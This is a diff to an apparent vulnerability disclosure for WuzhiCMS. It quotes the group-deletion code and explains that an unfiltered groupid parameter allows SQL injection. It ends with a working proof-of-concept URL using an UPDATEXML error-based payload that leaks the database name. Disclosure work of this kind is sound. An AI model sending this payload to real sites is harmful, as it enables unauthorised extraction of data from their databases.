@@ -2,6 +2,7 @@
 https://github.com/wuzhicms/wuzhicms
 ##  Vulnerability file:
 ### /coreframe/app/member/admin/group.php：132-160
+```php
  public function del() {
 	if(isset($GLOBALS['groupid']) && $GLOBALS['groupid']) {
 		if(is_array($GLOBALS['groupid'])) {
@@ -28,6 +29,7 @@ https://github.com/wuzhicms/wuzhicms
 		}
 	}
 }
+```
 In the group.php file, the $groupid parameter under the del method are controllable, and the $groupid parameter is not strictly filtered, causing SQL injection vulnerabilities!
 ## poc
 index.php?m=member&f=group&v=del&groupid=7 and UPDATEXML(1,CONCAT(0x7e,database()),3)&_su=wuzhicms&_menuid=86
